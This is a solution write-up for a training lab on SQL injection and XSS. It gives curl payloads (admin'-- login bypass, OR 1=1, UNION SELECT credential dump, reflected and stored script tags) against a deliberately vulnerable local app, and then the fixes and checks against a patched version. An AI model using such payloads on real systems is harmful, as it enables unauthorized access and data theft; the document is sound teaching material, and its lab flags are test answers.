🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A05 — Solution (spoilers!)

Try the lab yourself first, using the hints from the [README](./README.md).

All requests below are against vulnerable (port 8041).

## 1. Login bypass

The query in the application is built like this:

```sql
SELECT username, role, secret FROM users WHERE username = '<login>' AND password = '<password>'
```

If you put `admin'--` into the login, everything after `--` becomes a comment, and the password check disappears:

```sql
... WHERE username = 'admin'--' AND password = 'x'
```

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
# → logged in as admin and FLAG{a05_sqli_login_bypass}
```

Another option: the login `nobody' OR '1'='1' --`, the condition becomes always true, and you are logged in as the first user in the table.

## 2. The hidden product

```sql
SELECT id, name, price FROM products WHERE name LIKE '%<q>%' AND hidden = 0
```

```bash
curl -G http://127.0.0.1:8041/products --data-urlencode "q=%' OR 1=1 --"
# the hidden product with FLAG{a05_hidden_product} appears in the response
```

`OR 1=1` makes the condition true, and `--` throws away `AND hidden = 0`.

## 3. UNION: data from another table

The original query returns three columns (`id`, `name`, `price`), so `UNION SELECT` must have three too:

```bash
curl -G http://127.0.0.1:8041/products \
  --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"
# the name field holds admin, and the price field holds FLAG{a05_sqli_union_dump}
```

Try `q='` with nothing after it: the application returns the SQL error text. Such errors help an attacker understand the structure of the query, so they must not be shown to the user.

## 4. XSS

**Reflected.** The script arrives in a parameter and goes straight into the page. Open in a browser:

```
http://127.0.0.1:8041/search?q=<script>alert(1)</script>
```

**Stored.** The script is saved on the server and runs for everyone who opens the page:

```bash
curl -H 'Content-Type: application/json' \
  -d '{"name":"x","message":"<script>alert(1)</script>"}' http://127.0.0.1:8041/guestbook
```

Then open http://127.0.0.1:8041/guestbook in a browser. In a real system, instead of `alert(1)` there could be code that steals the user's data, which is why XSS is dangerous.

The guestbook is kept in the application's memory and is cleared on restart.

## Fixes (fixed, port 8042)

| Problem | Fix |
|---------|-----|
| String concatenation in SQL (login, search) | Parameterized queries: `... WHERE username = ?`, `... LIKE ?` |
| Output without escaping (search, guestbook) | `markupsafe.escape` on output: `<` becomes `&lt;` |
| No defense in depth | The header `Content-Security-Policy: default-src 'none'` forbids running scripts, field lengths are limited |
| Password compared inside SQL | The password is compared in code with `hmac.compare_digest` |
| Database error text in the response | The SQL error no longer occurs, and the queries do not depend on the input |

Check on fixed (port 8042):

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login         # 401
curl -G http://127.0.0.1:8042/products --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"   # []
curl "http://127.0.0.1:8042/search?q=<script>alert(1)</script>"   # the response contains &lt;script&gt;...
```

## What else to remember
- Escaping depends on the context (HTML, attribute, JavaScript, URL), so it is better to use a template engine with auto-escaping.
- Parameterization protects values, but not table and column names: they must not be taken from input, only from an allow list.
- Injections are not limited to SQL and HTML: OS commands, LDAP, NoSQL queries. The principle is the same everywhere: data must not be mixed with code.
- Passwords in this lab are stored in plain text only for simplicity. For password storage see lab A04.
